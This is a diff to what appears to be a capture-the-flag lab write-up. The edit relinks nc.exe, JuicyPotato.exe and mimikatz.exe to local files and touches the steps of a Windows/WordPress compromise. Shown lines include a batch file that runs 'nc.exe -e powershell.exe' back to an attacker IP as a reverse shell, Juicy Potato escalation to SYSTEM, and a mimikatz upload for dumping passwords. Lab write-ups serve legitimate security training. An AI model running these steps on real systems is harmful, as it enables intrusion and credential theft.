@@ -121,7 +121,7 @@ A netcat binary is uploaded to the machine for a more stable shell.
 
 ## Netcat
 
-On your machine, download `nc.exe`:
+On your machine, download [`nc.exe`](files/nc.exe):
 
 ~~~
 unknown@kali:~/Downloads$ cd ~/Downloads/
@@ -175,9 +175,7 @@ Meterpreter : php/windows
 
 Juicy Potato is a variant of the exploit that allows service accounts on Windows to escalate to SYSTEM (highest privileges) by leveraging the BITS and the `SeAssignPrimaryToken` or `SeImpersonate privilege` in a MiTM attack.
 
-We can exploit this by uploading the Juicy Potato [binary](https://github.com/ohpe/juicy-potato) and executing it.
-
-First, we need to compile juicy-potato. Either do it yourself, or download it from my [github](files/JuicyPotato.exe).
+We can exploit this by uploading the Juicy Potato [binary](files/JuicyPotato.exe) and executing it.
 
 As before, we can use our meterpreter shell to do the upload and then we can use the netcat shell to execute the exploit.
 
@@ -198,13 +196,13 @@ meterpreter > mv JuicyPotato.exe js.exe
 We can create a batch file that will be executed by the exploit, and return a SYSTEM shell. Let's add the following contents to `shell.bat` (run it from the first reverse shell running on port 1234, and replace the IP with yours):
 
 ~~~
-C:\inetpub\wwwroot\wordpress\wp-content\uploads> echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.195 1111 > shell.bat
+C:\inetpub\wwwroot\wordpress\wp-content\uploads>echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.195 1111 > shell.bat
 ~~~
 
 Let's start another netcat listener:
 
 ~~~
-$ rlwrap nc -nlvp 1111
+unknown@kali:~/Downloads$ rlwrap nc -nlvp 1111
 ~~~
 
 Next, we execute the netcat shell using the following command (from the first reverse shell running on port 1234).
@@ -245,7 +243,7 @@ PS C:\Windows\system32>
 
 # Post Exploitation
 
-Mimikatz can be used to dump cached passwords. From the meterpreter session:
+[Mimikatz](files/mimikatz.exe) can be used to dump cached passwords. From the meterpreter session:
 
 ~~~
 meterpreter > upload mimikatz.exe
